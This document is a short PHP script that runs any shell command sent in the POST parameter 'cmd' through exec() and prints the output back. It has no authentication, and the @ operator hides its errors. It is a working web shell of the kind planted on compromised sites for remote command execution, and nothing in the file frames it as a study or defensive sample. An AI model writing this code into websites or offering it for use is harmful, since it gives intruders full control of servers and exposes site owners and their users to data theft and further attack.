<?php
function Exec_Run($cmd)
{
	$res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	return $res;
}

if(!empty($_POST['cmd'])){
	$res = Exec_Run($_POST['cmd']);
	echo $res;
}
?>